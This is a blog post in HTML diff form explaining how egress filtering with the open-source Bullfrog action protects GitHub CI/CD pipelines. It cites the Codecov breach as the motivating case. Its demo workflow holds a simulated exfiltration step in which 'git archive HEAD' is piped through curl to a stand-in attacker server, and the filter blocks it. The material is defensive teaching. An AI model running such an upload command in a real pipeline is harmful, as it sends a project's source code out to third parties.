@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Securing CI/CD Pipelines with Egress Filtering</title>
+
+    <meta property="og:title" content="Securing CI/CD Pipelines with Egress Filtering" />
+
+
+
+
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2024-06-30T00:00:00.000Z" />
+
+  <meta property="profile:first_name" content="Mathieu">
+  <meta property="profile:last_name" content="Larose">
+
+
+<meta property="og:url" content="https://mathieularose.com/securing-ci-cd-pipelines-with-egress-filtering" />
+
+
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.5.1/katex.min.css"
+    />
+    <link rel="stylesheet" href="./main.css" />
+    <link rel="me" href="https://mastodon.social/@mathieularose" />
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="Mathieu Larose"
+      type="application/atom+xml"
+    />
+  </head>
+
+  <body class="">
+    <header class="">
+  <h1>Mathieu Larose</h1>
+
+  <nav>
+    <ul>
+      <li><a href="/" class="">Home</a></li>
+      <li><a href="/services" class="">Services</a></li>
+      <li><a href="/projects" class="">Projects</a></li>
+    </ul>
+  </nav>
+</header>
+ 
+
+<main>
+  <hgroup>
+    <h1>Securing CI/CD Pipelines with Egress Filtering</h1>
+    <p>June 2024</p>
+  </hgroup>
+
+  <p>Developers often focus on securing their production environments, yet they often overlook securing their CI/CD pipeline — a crucial component of their system. These pipelines can serve as a hidden entry point for attackers.</p>
+<p>Modern development relies heavily on third-party integrations within pipelines, like GitHub Actions, npm packages, and Docker images. While these tools accelerate development, they also introduce potential security risks.</p>
+<p>By default, many CI/CD pipelines operate with unrestricted outbound traffic, essentially acting like wide-open highway for data. This convenience creates a significant security blind spot. Malicious code hidden within trusted third-party libraries could exploit this openness to exfiltrate sensitive data or source code.</p>
+<h2>The 2021 Codecov Breach: A Valuable Lesson</h2>
+<p>The <a href="https://about.codecov.io/security-update/">2021 Codecov incident</a> serves as a good reminder of the potential dangers lurking within CI/CD pipelines. Attackers infiltrated Codecov's Bash Uploader, a tool used to upload code coverage data. This compromise allowed them to execute arbitrary commands within the CI/CD pipelines of all Codecov users. Due to a lack of egress filtering in many pipelines, attackers were able to steal sensitive information, like secrets stored in environment variables. This incident highlights the critical importance of robust security measures throughout the entire development lifecycle, including CI/CD pipelines.</p>
+<h2>Egress Filtering: A Firewall for Outbound Traffic</h2>
+<p>To address this security risk, egress filtering acts as a firewall specifically for outbound data. It monitors and restricts outgoing connections based on pre-defined rules, ensuring only authorized connections occur. This strengthens your CI/CD pipeline security by preventing unauthorized outbound connections.</p>
+<h2>Implementing Egress Filtering for GitHub Workflows</h2>
+<p>Here's how you can implement egress filtering in your GitHub workflows using <a href="https://github.com/bullfrogsec/bullfrog">Bullfrog</a>, an open-source tool.</p>
+<p>Add the following step at the beginning of your job configuration file:</p>
+<pre class="hljs"><code class="hljs"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Bullfrog</span> <span class="hljs-string">Secure</span> <span class="hljs-string">Runner</span>
+  <span class="hljs-attr">uses:</span> <span class="hljs-string">bullfrogsec/bullfrog@v0</span>
+  <span class="hljs-attr">with:</span>
+    <span class="hljs-attr">egress-policy:</span> <span class="hljs-string">block</span>
+</code></pre>
+<p>By default, this configuration blocks all outbound connections from your workflow. To allow specific domains or IP addresses, modify the configuration as needed. For example, to allow connections to <code>example.com</code>, adjust the configuration as follows:</p>
+<pre class="hljs"><code class="hljs"><span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Bullfrog</span> <span class="hljs-string">Secure</span> <span class="hljs-string">Runner</span>
+  <span class="hljs-attr">uses:</span> <span class="hljs-string">bullfrogsec/bullfrog@v0</span>
+  <span class="hljs-attr">with:</span>
+    <span class="hljs-attr">allowed-domains:</span> <span class="hljs-string">|
+      example.com
+</span>    <span class="hljs-attr">egress-policy:</span> <span class="hljs-string">block</span>
+</code></pre>
+<h3>Example Scenario</h3>
+<p>Below is a practical example demonstrating how egress filtering effectively blocks a malicious script from attempting to exfiltrate sensitive information. You can explore this example at <a href="https://github.com/larose/bullfrog-demo">github.com/larose/bullfrog-demo</a>.</p>
+<pre class="hljs"><code class="hljs"><span class="hljs-attr">jobs:</span>
+  <span class="hljs-attr">with-bullfrog:</span>
+    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-24.04</span>
+    <span class="hljs-attr">timeout-minutes:</span> <span class="hljs-number">2</span>
+    <span class="hljs-attr">steps:</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Checkout</span>
+        <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v4.1.7</span>
+
+      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Bullfrog</span> <span class="hljs-string">Secure</span> <span class="hljs-string">Runner</span>
+        <span class="hljs-attr">uses:</span> <span class="hljs-string">bullfrogsec/bullfrog@v0</span>
+        <span class="hljs-attr">with:</span>
+          <span class="hljs-attr">allowed-domains:</span> <span class="hljs-string">|
+            example.com
+</span>          <span class="hljs-attr">egress-policy:</span> <span class="hljs-string">block</span>
+
+      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Simulate</span> <span class="hljs-string">Legitimate</span> <span class="hljs-string">HTTP</span> <span class="hljs-string">Requests</span>
+        <span class="hljs-attr">run:</span> <span class="hljs-string">|
+          # This call is allowed since example.com is specified in the allowed-domains variable above
+          curl -I https://example.com
+</span>
+      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Simulate</span> <span class="hljs-string">Malicious</span> <span class="hljs-string">Script</span>
+        <span class="hljs-attr">run:</span> <span class="hljs-string">|
+          echo &quot;Creating an archive of the HEAD of the git repo and uploading it to a malicious server&quot;
+          git archive HEAD | curl -X POST -H &quot;Content-Type: application/octet-stream&quot; --data-binary @- https://jsonplaceholder.typicode.com/git-repo
+          # This line is not reached due to blocked egress
+</span></code></pre>
+<p>See the workflow run below:</p>
+<p><img src="securing-ci-cd-pipelines-with-egress-filtering/malicious-script.png" alt=""></p>
+<p>This demonstration highlights how the attempt to connect to <code>jsonplaceholder.typicode.com</code>, representing an attacker's server in this scenario, was blocked.</p>
+<p>Of course, the threat typically doesn't originate from an overtly malicious script like the one shown above. Instead, it often arises from a compromised trusted third-party library, similar to what occurred in the Codecov breach. Egress filtering plays a crucial role in mitigating these risks by strictly controlling outgoing connections, ensuring that your workflows do not unintentionally transmit sensitive information.</p>
+
+
+  <div class="notice promotion">
+    <p>Like this article? Get notified of new ones:</p>
+
+    <form
+      action="https://app.convertkit.com/forms/6531879/subscriptions"
+      method="post"
+      data-uid="625243fa5c"
+      data-format="inline"
+      data-version="5"
+    >
+      <input
+        class="px-1 py-1"
+        name="email_address"
+        type="text"
+        placeholder="Email address"
+      />
+      <button
+        type="submit"
+        data-element="submit"
+        class="bg-indigo-500 hover:bg-indigo-700 text-white py-1 px-3 rounded"
+      >
+        Subscribe
+      </button>
+    </form>
+  </div>
+</main>
+ <footer class="">
+  <nav>
+    <ul>
+      <li>
+        ©
+        <a class="contrast" href="/">Mathieu Larose</a>
+      </li>
+      <li>
+        <a class="contrast" href="mailto:mathieu@mathieularose.com">Email</a>
+      </li>
+      <li>
+        <a class="contrast" href="https://www.linkedin.com/in/mathieularose/"
+          >LinkedIn</a
+        >
+      </li>
+      <li>
+        <a class="contrast" href="https://github.com/larose">GitHub</a>
+      </li>
+      <li>
+        <a class="contrast" href="/atom.xml">Atom</a>
+      </li>
+    </ul>
+  </nav>
+</footer>
+
+
+    <!-- Cloudflare Web Analytics -->
+    <script
+      defer
+      src="https://static.cloudflareinsights.com/beacon.min.js"
+      data-cf-beacon='{"token": "e36c8a0587da4db0ac82e9037c3fb192"}'
+    ></script>
+    <!-- End Cloudflare Web Analytics -->
+  </body>
+</html>
